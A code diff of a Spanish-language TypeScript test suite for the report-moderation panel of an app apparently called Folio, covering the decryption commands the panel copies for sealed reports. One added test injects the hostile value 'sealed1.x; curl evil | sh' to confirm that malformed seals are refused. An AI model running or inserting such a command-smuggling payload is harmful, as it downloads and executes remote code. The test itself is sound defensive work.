@@ -21,8 +21,9 @@ const QUEUE: Queue = {
       category: "csam",
       level: "grave",
       detail: HARM,
-      sealedLink: "sealed1.opaque",
-      sealedContact: "contact1.opaque",
+      sealedLink:
+        "sealed1.oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo",
+      sealedContact: "contact1.oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo",
       version: 2,
       at: 20_000,
       asn: 3,
@@ -266,6 +267,19 @@ describe("a warning by light reports", () => {
   });
 });
 
+describe("a seal that is not one", () => {
+  it("offers no command to copy, and says why", () => {
+    const [first, ...rest] = QUEUE.reports;
+    const odd = { ...(first as (typeof QUEUE.reports)[number]), sealedLink: "sealed1.x; curl evil | sh" };
+    drawQueue(page, { ...QUEUE, reports: [odd, ...rest] }, doing as unknown as Doing);
+    const card = (page.getElementById("reports") as Element).querySelector(".card") as Element;
+    const offered = [...card.querySelectorAll("button")].map((one) => one.textContent);
+    expect(offered).not.toContain("Abrir denuncia");
+    expect(offered).not.toContain("Comprobar sin abrir");
+    expect(card.textContent).toContain("no tiene la forma esperada");
+  });
+});
+
 describe("a network past its documents", () => {
   it("says so on its report, and only there", () => {
     expect(page.getElementById("reports")?.textContent).not.toContain("pasó su tope");
@@ -283,7 +297,7 @@ describe("checking a key", () => {
   it("copies a command that opens nothing, only where a link came", () => {
     pressing("reports", "Comprobar sin abrir");
     expect(doing.copy).toHaveBeenCalledWith(
-      'node scripts/report-key.mjs check ~/folio-reports.key AbCdEfGh sealed1.opaque "<link para verificar>"',
+      'node scripts/report-key.mjs check ~/folio-reports.key AbCdEfGh sealed1.oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo "<link para verificar>"',
       "Cambia <link para verificar> por uno del panel, entre las comillas. Dice si la llave abre ese documento, sin leer nada.",
       expect.anything(),
     );
@@ -411,7 +425,7 @@ describe("a case in the panel", () => {
     const noted = fetching.mock.calls.find(([path]) => path === "/api/docs/AbCdEfGh/opened");
     expect(JSON.parse(String(noted?.[1]?.body))).toEqual({ note: "verificar la denuncia" });
     expect(writeText).toHaveBeenCalledWith(
-      "node scripts/report-key.mjs open ~/folio-reports.key AbCdEfGh sealed1.opaque",
+      "node scripts/report-key.mjs open ~/folio-reports.key AbCdEfGh sealed1.oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo",
     );
     const card = (page.getElementById("reports") as Element).querySelector(".card") as Element;
     await vi.waitFor(() => expect(card.querySelector(".card-steps")).not.toBeNull());
@@ -419,7 +433,7 @@ describe("a case in the panel", () => {
     expect(steps.textContent).toContain("Copiado.");
     expect(steps.textContent).toContain("Imprime el link de la denuncia");
     expect(steps.querySelector("code")?.textContent).toBe(
-      "node scripts/report-key.mjs open ~/folio-reports.key AbCdEfGh sealed1.opaque",
+      "node scripts/report-key.mjs open ~/folio-reports.key AbCdEfGh sealed1.oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo",
     );
     expect(page.getElementById("said")?.textContent).toBe("");
   });
@@ -559,11 +573,13 @@ describe("the panel", () => {
     pressing("reports", "Abrir denuncia");
     expect(doing.openReport).toHaveBeenCalledWith(
       "AbCdEfGh",
-      "node scripts/report-key.mjs open ~/folio-reports.key AbCdEfGh sealed1.opaque",
+      "node scripts/report-key.mjs open ~/folio-reports.key AbCdEfGh sealed1.oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo",
       expect.anything(),
       "link",
     );
-    expect(page.getElementById("reports")?.textContent).not.toContain("sealed1.opaque");
+    expect(page.getElementById("reports")?.textContent).not.toContain(
+      "sealed1.oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo",
+    );
   });
 
   it("offers to mark any report false, and opening only where a link came", () => {
@@ -620,11 +636,13 @@ describe("the panel", () => {
     pressing("reports", "Leer su correo");
     expect(doing.openReport).toHaveBeenCalledWith(
       "AbCdEfGh",
-      "node scripts/report-key.mjs open ~/folio-reports.key AbCdEfGh contact1.opaque",
+      "node scripts/report-key.mjs open ~/folio-reports.key AbCdEfGh contact1.oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo",
       expect.anything(),
       "contact",
     );
-    expect(page.getElementById("reports")?.textContent).not.toContain("contact1.opaque");
+    expect(page.getElementById("reports")?.textContent).not.toContain(
+      "contact1.oooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo",
+    );
     const offered = [...(page.getElementById("reports") as Element).querySelectorAll("button")];
     expect(offered.filter((one) => one.textContent === "Leer su correo")).toHaveLength(1);
   });
